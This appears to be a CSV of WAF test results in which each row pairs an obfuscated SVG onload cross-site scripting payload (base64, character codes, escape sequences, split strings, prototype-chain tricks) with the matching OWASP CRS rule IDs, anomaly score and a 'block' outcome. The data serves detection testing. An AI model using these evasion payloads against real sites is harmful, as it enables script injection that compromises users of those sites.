index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
2407,"<svg onload=""new Function(window['atob']('YWxlcnQoMSk='))()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o25,34v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,61 || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o26,14v217,61t:urlDecodeUni,t:compressWhitespace || ",30,177603561382.582089
2409,"<svg onload=""new	Function(''+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,54 || o13,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603561592.323751
2410,"<svg/onload=""new Function(''+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,54 || o13,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603561642.512991
2411,"<svg	onload=""new Function(''+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,54 || o13,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603561843.410698
2412,"<svg onload=""new Function([]+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,54 || o13,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603561955.052911
2413,"<svg onload=""new Function(atob`YWxlcnQoMSk=`)()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,49 || v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562062.506849
2414,"<svg onload=""new Function(atob.call(null,'YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,61 || v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562122.908889
2415,"<svg onload=""new Function(atob.apply(null,['YWxlcnQoMSk=']))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562339.447430
2416,"<svg onload=""new Function(self.atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,56 || v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562481.238320
2417,"<svg onload=""new Function(top.atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,55 || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562577.779195
2418,"<svg onload=""new Function(parent.atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,58 || v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603562623.252005
2420,"<svg onload=""Function('\u0061\u006c\u0065\u0072\u0074(1)')()"">",0,1,block,5,"941100,941120,941160,942100,949110","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,62 || ",20,177603562899.972875
2425,"<svg onload=""new Function('\141\154\145\162\164(1)')()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,56 || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603563580.639737
2426,"<svg onload=""new Function('\u{61}\u{6c}\u{65}\u{72}\u{74}(1)')()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603563666.660855
2428,"<svg onload=""new top['Function']('\u0061\u006c\u0065\u0072\u0074(1)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o20,51v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o17,15v217,73t:urlDecodeUni,t:compressWhitespace || ",25,177603563952.044433
2429,"<svg onload=""new(Function)('\u0061\u006c\u0065\u0072\u0074(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,49v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603564025.011408
2434,"<svg onload=""new Function(atob('YWxlcnQoMSk'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,50 || v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603564642.930152
2436,"<svg onload=""new Function('\x61'+'l'+'e'+'r'+'t(1)')()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,56 || o13,13v217,56t:urlDecodeUni || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603564917.057178
2439,"<svg onload=""new Function(String.fromCodePoint(97,108,101,114,116,40,49,41))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603565233.393220
2440,"<svg onload=""new Function('al'+`\u0065`+'rt(1)')()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,52 || o13,13v217,52t:urlDecodeUni || v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603565426.331834
2443,"<svg onload=""new Function(['al','ert','(1)'].join(''))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,58 || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603565799.545424
2444,"<svg onload=""new Function('al'+'e'+'r'+'t'+'(1)')()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,53 || o13,13v217,53t:urlDecodeUni || v217,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603565847.542534
2445,"<svg onload=""new Function(String['fromCharCode'](97,108,101,114,116,40,49,41))()"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o25,55v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603566041.574042
2447,"<svg onload=""new Function(`al${'e'}rt(1)`)()"">",0,1,block,6,"932130,934100,941100,941120,941160,949110","o28,4v216,46t:urlDecodeUni,t:cmdLine || o13,13v216,46 || v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603566242.054365
2448,"<svg onload=""new Function('al'.concat(String.fromCharCode(101),'rt(1)'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603566449.525673
2449,"<svg onload=""new Function(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+String.fromCharCode(40,49,41))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,121 || o13,13v217,121t:urlDecodeUni || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603566593.716127
2450,"<svg onload=""new Function('al\145rt\501\51')()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,48 || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603566682.760761
2451,"<svg onload=""new Function(['al','er','t(',1,')'].join(''))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760356670.770301
2452,"<svg onload=""new Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603566822.031351
2456,"<svg onload=""new Function(unescape('%61%6c%65%72%74%28%31%29'))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,67 || o13,13v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603567324.267023
2463,"<svg onload=""new(self.Function)('ale'+'rt(9)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,32v216,50t:urlDecode,t:replaceComments,t:compressWhitespace || v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603568120.390628
2470,"<svg onload=""top.Function('retu'+'rn ale'+'rt(9)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603569064.300403
2476,"<svg onload=""new(false['__proto__']['__proto__']['constructor']['constructor'])('ale'+'rt(9)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,80v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603569825.272055
2478,"<svg onload=""Function('ale'+'rt(1)')()"">",0,1,block,6,"941100,941120,941160,942100,942100,949110","v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,40 || v216,40t:urlDecodeUni || ",25,177603570161.970752
2491,"<svg onload=""new/**/Function/**/('ale'+'rt(1)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603571877.132316
2496,"<svg onload=""new Function('ret'+'urn aler'+'t')()(1)""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o25,27v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,60 || o13,13v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603572451.209586
2498,"<svg onload=""new Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116))()(1)""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603572755.177266
2499,"<svg onload=""new Function(['ret','urn ale','rt'].join(''))()(1)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o53,10v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760357280.904977
2500,"<svg onload=""new/**/ Function('return ale'+'rt')()(1)""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o25,24v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603572929.428507
2501,"<svg onload=""new Function(`return ale`+`rt`)()(1)""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,57 || o13,13v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603573034.936851
2502,"<svg onload=""new Function('return\x20ale'+'rt')()(1)""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,60 || o13,13v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603573195.214920
2503,"<svg onload=""new Function(atob('cmV0dXJuIGFsZXJ0'))()(1)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o25,31v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603573336.383414
2504,"<svg onload=""new Function('return\u0020\u0061lert')()(1)""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603573495.860113
2509,"<svg onload=""new Function('re'+'turn al'+'ert')()(1)""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o25,27v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,60 || o13,13v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603574057.439432
2510,"<svg onload=""new Function(['r','e','t','u','r','n',' ','a','l','e','r','t'].join(''))()(1)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o80,10v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603574170.681812
2511,"<svg onload=""new Function(window[String.fromCharCode(97,116,111,98)]('cmV0dXJuIGFsZXJ0'))()(1)""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o68,26v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o26,42v217,102t:urlDecodeUni,t:compressWhitespace || ",30,177603574324.962974
